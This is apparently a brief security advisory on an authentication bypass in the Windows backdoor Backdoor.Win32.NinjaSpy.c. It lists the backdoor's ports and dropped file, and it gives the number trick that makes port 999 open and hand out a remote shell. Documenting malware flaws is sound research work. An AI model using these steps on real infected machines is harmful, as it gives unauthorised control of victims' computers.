Threat: Backdoor.Win32.NinjaSpy.c
Vulnerability: Authentication Bypass
Description: The malware listens on TCP ports 2003, 2004 and drops a PE
file named "cmd.dll" under Windows dir. Connecting to port 2003, you will
get back a number "9951" from the infected host. If we send the value 1000
we get a message in Portugese "Pisca Pisca Ativado" translates to "Blink
Blink Activated". If we connect to port 2004 and send "abc123" we get
message "Acesso negado..." translates to "Access denied". However, if you
take the initial number we received earlier (9951) when connecting to port
2003 and apply some calculation we expose hidden functionality. Take the
9951 value and invert the first two digits to 66 and then add together the
last two 5 + 1 to equal 6 for a final value of "666". Example, initial
number (9951) 99 inverted equals 66 and 5 + 1 = 6. Enter and send the
constructed value of "666" to port 2003 and TCP port 999 is opened. Connect
to port 999 and you get back a remote shell.
